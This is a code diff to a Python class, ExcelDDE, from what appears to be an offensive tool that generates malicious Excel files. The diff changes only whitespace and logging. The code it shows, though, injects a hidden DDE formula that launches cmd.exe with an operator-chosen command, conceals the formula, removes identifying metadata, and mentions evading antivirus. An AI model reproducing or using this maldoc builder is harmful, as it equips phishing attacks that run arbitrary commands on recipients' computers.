@@ -23,24 +23,24 @@ class ExcelDDE(ExcelGenerator):
         logging.info(" [+] Generating MS Excel with DDE document...")
         try:
             # Get command line
-            paramDict = OrderedDict([("Cmd_Line",None)])      
+            paramDict = OrderedDict([("Cmd_Line",None)])
             self.fillInputParams(paramDict)
             command = paramDict["Cmd_Line"]
-            
-            
+
+
             logging.info("   [-] Open document...")
             # open up an instance of Excel with the win32com driver\        \\
             excel = win32com.client.Dispatch("Excel.Application")
             # do the operation in background without actually opening Excel
             #excel.Visible = False
             workbook = excel.Workbooks.Open(self.outputFilePath)
-    
+
             logging.info("   [-] Inject DDE field (Answer 'No' to popup)...")
-            
+
             ddeCmd = r"""=MSEXCEL|'\..\..\..\Windows\System32\cmd.exe /c %s'!A1""" % command.rstrip()
             excel.Cells(1, 26).Formula = ddeCmd
             excel.Cells(1, 26).FormulaHidden = True
-            
+
             # Remove Informations
             logging.info("   [-] Remove hidden data and personal info...")
             xlRDIAll=99
@@ -49,11 +49,14 @@ class ExcelDDE(ExcelGenerator):
             excel.DisplayAlerts=False
             excel.Workbooks(1).Close(SaveChanges=1)
             excel.Application.Quit()
-            
+
             # garbage collection
             del excel
-            logging.info("   [-] Generated %s file path: %s" % (self.outputFileType, self.outputFilePath))
-         
+            logging.info(
+                f"   [-] Generated {self.outputFileType} file path: {self.outputFilePath}"
+            )
+
+
         except Exception:
             logging.exception(" [!] Exception caught!")
             logging.error(" [!] Hints: Check if MS office is really closed and Antivirus did not catch the files")
